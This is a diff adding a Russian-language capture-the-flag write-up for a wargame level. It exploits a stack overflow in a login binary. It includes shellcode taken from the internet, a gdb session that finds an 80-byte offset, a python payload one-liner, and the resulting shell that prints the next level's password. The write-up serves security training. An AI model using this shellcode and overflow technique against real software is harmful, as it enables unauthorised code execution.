@@ -1,0 +1,54 @@
+у нас нигде нет вызова функции system поэтому будем использовать shellcode
+
+
+про шелкод https://www.youtube.com/watch?v=zkAEi9zbB_0
+
+в первом fget положим shellcode + ('dart_wil' чтоб пройти проверку)
+
+во втором переполним буффер и пойдум туда. + ('admin' чтоб пройти проверку)
+
+shellcode из интернета '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' - 28 длина
+
+Адресс, где будет храниться shellcode из 1 gets: - глобальная переменная a_user_name - 0x804a040 + 7 (7 из )
+
+
+Сколько надоб чтобы переполнить стек при 2 fgets:
+   https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+   запускаем 1 
+   (gdb) c
+   Continuing.
+   ********* ADMIN LOGIN PROMPT *********
+   Enter Username: dat_wil
+   verifying username....
+
+   Enter Password:
+   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+   nope, incorrect password...
+
+
+   Breakpoint 2, 0x080485b4 in main ()
+   (gdb) c
+   Continuing.
+
+   Program received signal SIGSEGV, Segmentation fault.
+   0x37634136 in ?? ()
+
+   вдиваем число в генератор, получаем 80
+
+
+ИТОГ:
+
+python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1]" > /tmp/level01
+
+level01@OverRide:~$ (cat /tmp/level01 ; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
